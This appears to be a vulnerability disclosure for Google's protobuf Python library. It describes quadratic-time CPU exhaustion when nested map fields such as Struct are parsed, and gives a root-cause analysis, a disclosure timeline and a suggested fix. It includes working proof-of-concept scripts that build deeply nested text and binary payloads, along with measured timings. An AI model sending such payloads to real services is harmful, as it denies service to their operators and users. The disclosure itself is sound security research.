# Quadratic-time denial of service in text_format.Parse for recursive map fields

https://github.com/protocolbuffers/protobuf

## Disclosure

 - 9 June 2026 - reported via Google Bug Hunter: https://issuetracker.google.com/issues/521818737
 - 14 June 2026 - followed up on status
 - 18 June 2026 - Google responded that they aren't concerned with availability:
 - <img width="856" height="453" alt="image" src="https://github.com/user-attachments/assets/6b68a922-5934-4115-8d58-820e42e2a086" />
 - 18 June 2026 - disagreed with Google's assessment and pointed out discrepancies with data points
 - 20 June 2026 - Google requested for more details
 - 20 June 2026 - provided Google with requested details
 - 10 July 2026 - ticket remained closed as WAI, disclosing here

### Summary

`text_format.Parse` runs in quadratic time, O(N squared), when parsing a message whose recursion goes through a `map` field with a message value. The standard `google.protobuf.Struct` type triggers it. A roughly 74 KB input consumes about 21 seconds of single-core CPU, and the cost grows quadratically with input size, so a small payload can pin a CPU core for minutes. This is realistic because `Struct` is protobuf's standard type for arbitrary JSON-like data and is parsed from untrusted input in many services.

### Details

The cause is in `python/google/protobuf/text_format.py`, function `_MergeMessageField`, the map-entry branch (HEAD lines 1248 to 1252; released 6.33.6 lines 1106 to 1110):

```python
if is_map_entry:
  value_cpptype = field.message_type.fields_by_name['value'].cpp_type
  if value_cpptype == descriptor.FieldDescriptor.CPPTYPE_MESSAGE:
    value = getattr(message, field.name)[sub_message.key]
    value.CopyFrom(sub_message.value)   # deep-copies the entire accumulated subtree, once per level
```

The inner sub-message is parsed first, building the whole deeper subtree, then the entire `sub_message.value` is deep-copied (`CopyFrom`) into the map entry. This happens at every nesting level, so level k copies a subtree of size proportional to (N minus k), giving a total of O(N squared) work.

The affected code is the pure-Python `text_format` parser, which is used regardless of the message backend. The C++/upb backend only supplies message classes; `text_format.Parse` itself is always this Python code.

A self-recursive non-map message (`message Rec { Rec child = 1; }`) parses linearly, isolating the map-entry `CopyFrom` as the root cause.

This is distinct from the protobuf-python recursion and stack-depth DoS issues (CVE-2022-1941 family). No recursion-depth limit mitigates this, because the blowup is per-level copy work, not stack depth.

### PoC

```
pip install protobuf
python poc_text_format_quadratic.py
```

`poc_text_format_quadratic.py`:

```python
import os, sys, time
os.environ["PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION"] = "python"
from google.protobuf import text_format
from google.protobuf.struct_pb2 import Struct
sys.setrecursionlimit(10_000_000)
prev = None
for N in (200, 400, 800, 1600):
    text = ('fields { key: "k" value { struct_value { ' * N) + ("} } }" * N)
    t = time.time(); text_format.Parse(text, Struct()); dt = time.time() - t
    ratio = f"  ({dt/prev:.1f}x)" if prev else ""
    print(f"depth={N:5d}  input={len(text):7d} bytes  parse={dt:7.3f}s{ratio}", flush=True)
    prev = dt
```

Observed timings: depth 200 (9,200 bytes) 0.254s; depth 400 (18,400 bytes) 1.102s; depth 800 (36,800 bytes) 4.855s; depth 1600 (73,600 bytes) 20.885s. Each doubling of input multiplies time by about 4.3, confirming O(N squared).

### Attack scenario

A small (under 100 KB) text-format payload causes tens of seconds to minutes of single-core CPU consumption wherever a service parses untrusted text-format data into a `Struct` or any recursive `map` with a message value. Availability impact only, no authentication required.


**1. Not limited to text_format.** The same quadratic anti-pattern is in the core binary wire-format decoder, the default path every consumer uses to parse untrusted bytes (`Message.ParseFromString` / `MergeFromString`). In the pure-Python backend, `MapDecoder` runs:

`google/protobuf/internal/decoder.py:979` -> `value[submsg.key].CopyFrom(submsg.value)`

For a message recursing through a `map<K, Message>` field, the inner subtree is deep-copied into the map entry at every nesting level, so parse cost is O(N^2). Identical root cause to the reported `text_format._MergeMessageField` (`value.CopyFrom(sub_message.value)`); present in both parsers.

**2. New measurements** (binary `ParseFromString` into `google.protobuf.Struct`, pure-Python backend, protobuf 6.33.6):

```
depth 200    2,357 bytes    0.55 s
depth 400    4,757 bytes    2.59 s  (4.7x)
depth 800    9,557 bytes   11.54 s  (4.5x)
depth 1600  19,850 bytes   49.79 s  (4.3x)
```

~20 KB of untrusted input consumes ~50 s of single-core CPU; ~4.3x per doubling confirms O(N^2). Smaller payload and larger amplification than the text_format case, via the standard deserialization API.

**3. Backend scope** (stated precisely for reproduction). The default upb/C++ backend depth-limits this payload and rejects it with `DecodeError`, so it is not affected. The pure-Python backend (`PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python`, the documented fallback) does not bound the per-level copy work, so neither the existing recursion/depth limit nor the C++ backend mitigates it. `google.protobuf.Struct` (`fields` is `map<string, Value>`, `Value.struct_value` is a `Struct`) is the standard carrier for untrusted JSON-like data, so deserializing a `Struct` from untrusted bytes is a realistic trigger.

**4. Precedent and threshold.** Same class as the protobuf binary-deserialization resource-exhaustion issues you have tracked: CVE-2024-7254, CVE-2022-3171, CVE-2021-22569, and in particular CVE-2025-4565, a pure-Python-backend-specific DoS in untrusted-message parsing. The characteristics match: unauthenticated, remote, small input, single default deserialization call, super-linear CPU.

Reproduction (binary path):

```python
import os, time
os.environ["PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION"] = "python"
from google.protobuf.struct_pb2 import Struct

def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        out.append(b | 0x80 if n else b)
        if not n: break
    return bytes(out)

def msg_field(f, p):
    return bytes([(f << 3) | 2]) + varint(len(p)) + p

def build(depth):
    inner = b""
    for _ in range(depth):
        inner = msg_field(1, b"\x0a\x01k" + msg_field(2, msg_field(5, inner)))
    return inner

for N in (200, 400, 800, 1600):
    data = build(N)
    t = time.time(); Struct().ParseFromString(data)
    print(f"depth={N} bytes={len(data)} parse={time.time()-t:.3f}s")
```

Suggested fix (both sinks): replace the per-level `CopyFrom` with a move/swap of the parsed sub-message into the map entry so total work is linear, in `decoder.MapDecoder` (decoder.py:979) and `text_format._MergeMessageField`. 

